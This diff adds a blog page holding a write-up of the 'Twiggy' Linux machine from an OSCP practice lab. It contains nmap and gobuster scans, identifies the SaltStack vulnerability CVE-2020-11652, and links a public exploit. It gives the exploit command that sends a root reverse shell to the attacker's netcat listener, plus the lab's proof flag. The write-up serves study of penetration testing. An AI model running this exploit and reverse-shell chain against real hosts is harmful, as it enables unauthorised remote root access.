@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Twiggy - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Twiggy Went down the rabbit hole with port 80 &amp; port 8000 too quickly, thinking this would require SQL injection or some sort of weird user enumeration to get into a web platform.
+Turns out the I needed to run nmap again with a full port scan (-p- -T5) and pick up ALL the ports before an aggressive service scan (-A -p 22,55,ect).
+2nd scan picked up 4505 and 4506 which correspond to ZeroMQ ZMTP 2.0 (saltStack). Looking up Saltstack showed a vulnerability (CVE-2020-11652)
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---twiggy---linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Twiggy - Linux">
+<meta property="og:description" content="Twiggy Went down the rabbit hole with port 80 &amp; port 8000 too quickly, thinking this would require SQL injection or some sort of weird user enumeration to get into a web platform.
+Turns out the I needed to run nmap again with a full port scan (-p- -T5) and pick up ALL the ports before an aggressive service scan (-A -p 22,55,ect).
+2nd scan picked up 4505 and 4506 which correspond to ZeroMQ ZMTP 2.0 (saltStack). Looking up Saltstack showed a vulnerability (CVE-2020-11652)
+" />
+<meta property="og:url" content="/posts/oscp---twiggy---linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---twiggy---linux/">OSCP - Twiggy - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="twiggy">Twiggy<a href="#twiggy" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Went down the rabbit hole with port 80 &amp; port 8000 too quickly, thinking this would require SQL injection or some sort of weird user enumeration to get into a web platform.</p>
+<p>Turns out the I needed to run nmap again with a full port scan (<code>-p- -T5</code>) and pick up ALL the ports before an aggressive service scan (<code>-A -p 22,55,ect</code>).</p>
+<p>2nd scan picked up <code>4505</code> and <code>4506</code> which correspond to ZeroMQ ZMTP 2.0 (saltStack). Looking up Saltstack showed a vulnerability (CVE-2020-11652)</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Basic Nmap scan, found 4 ports
+<ul>
+<li>Checked OpenSSH 7.4 but exploits wouldn&rsquo;t work (user enumeration)</li>
+<li>Checked website (p=80) and found Mezzanine site
+<ul>
+<li>Attempted SQL through login</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Re-ran Nmap scan with <code>-p- -T</code> followed by <code>-A</code> for found ports
+<ul>
+<li>Identified 4505 &amp; 4506 - ZeroMQ ZMTP 2.0 (SaltStack)</li>
+</ul>
+</li>
+<li>Found python exploit for Saltstack
+<ul>
+<li>Checked python code</li>
+<li>Ran netcat listener on port 80</li>
+<li>Ran exploit - root on listener.</li>
+</ul>
+</li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>ALWAYS run Nmap twice (and use <code>-p- -T5</code>)</li>
+<li>Try listening on a common port (eg. port 80) if your exploit doesn&rsquo;t initially work</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>gobuster: <code>gobuster dir -u  http://192.168.222.62:8000 -w //usr/share/dirb/wordlists/common.txt</code></li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- -T5 192.168.222.62
+</span></span><span class="line"><span class="cl">sudo nmap -p 22,53,80,4505,4506,8000 -A 192.168.222.62
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<pre tabindex="0"><code>sudo nmap -p- -T5 192.168.222.62 
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+4505/tcp open  unknown
+4506/tcp open  unknown
+8000/tcp open  http-alt
+
+[686.7sec = 11.4mins]
+---
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
+|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
+|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
+53/tcp   open  domain  NLnet Labs NSD
+80/tcp   open  http    nginx 1.16.1
+|_http-server-header: nginx/1.16.1
+|_http-title: Home | Mezzanine
+4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
+4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
+8000/tcp open  http    nginx 1.16.1
+|_http-server-header: nginx/1.16.1
+|_http-title: Site doesn&#39;t have a title (application/json).
+|_http-open-proxy: Proxy might be redirecting requests
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 3.X|4.X (88%), MikroTik RouterOS 6.X (85%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:mikrotik:routeros:6.15
+Aggressive OS guesses: Linux 3.11 - 4.1 (88%), Linux 3.16 (88%), Linux 3.10 - 3.12 (86%), Linux 4.4 (86%), Linux 4.9 (86%), Linux 3.2.0 (85%), MikroTik RouterOS 6.15 (Linux 3.3.5) (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   604.31 ms 192.168.45.1
+2   604.23 ms 192.168.45.254
+3   604.32 ms 192.168.251.1
+4   604.40 ms 192.168.222.62
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds
+</code></pre><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-22---openssh-74-protocol-20">Port 22 - OpenSSH 7.4 (protocol 2.0)<a href="#port-22---openssh-74-protocol-20" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-55---nlnet-labs-nsd">Port 55 - NLnet Labs NSD<a href="#port-55---nlnet-labs-nsd" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-80---http-nginx-1161">Port 80 - HTTP (nginx 1.16.1)<a href="#port-80---http-nginx-1161" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Mezzanine website
+<img src="/images/OSCP%20-%20Twiggy%20-%20Linux%20-%20image1.png" alt="OSCP Twiggy Linux Image1">
+Login page
+<img src="/images/OSCP%20-%20Twiggy%20-%20Linux%20-%20image2.png" alt="OSCP Twiggy Linux Image2"></p>
+<h2 id="port-4505---zeromq-zmtp-20-saltstack">Port 4505 - ZeroMQ ZMTP 2.0 (SaltStack)<a href="#port-4505---zeromq-zmtp-20-saltstack" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-4506----zeromq-zmtp-20-saltstack">Port 4506 -  ZeroMQ ZMTP 2.0 (SaltStack)<a href="#port-4506----zeromq-zmtp-20-saltstack" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-8000---http-apache">Port 8000 - HTTP (Apache)<a href="#port-8000---http-apache" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><code>gobuster dir -u  http://192.168.222.62:8000 -w //usr/share/dirb/wordlists/common.txt ![OSCP Twiggy Linux Image3](/images/OSCP%20-%20Twiggy%20-%20Linux%20-%20image3.png)</code>http:\192.168.222.62:8000\index<code>(Same as</code>login<code>and</code>run`)
+<img src="/images/OSCP%20-%20Twiggy%20-%20Linux%20-%20image4.png" alt="OSCP Twiggy Linux Image4"></p>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="name-of-the-technique">Name of the technique<a href="#name-of-the-technique" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><a href="https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py">https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py</a></p>
+<p>Exploit: <code>python 48421.py --master 192.168.222.62 --port 4506 -lh 192.168.45.246 -lp 80 --exec-choose master</code>
+Caught reverse shell with NetCat on port 80: <code>nc -lvnp 80</code></p>
+<hr>
+<h1 id="lateral-movement">Lateral Movement<a href="#lateral-movement" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Not required (logged in as root)</p>
+<h2 id="lateral-movement-vector">Lateral Movement vector<a href="#lateral-movement-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Not required (logged in as root)</p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Not required (logged in as root)</p>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>proof.txt - a985dd04611192b6db023d6f877a1503</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---squid---windows/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Squid - Windows</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---windows/" class="button inline next">
+         [<span class="button__text">OSCP - Windows</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
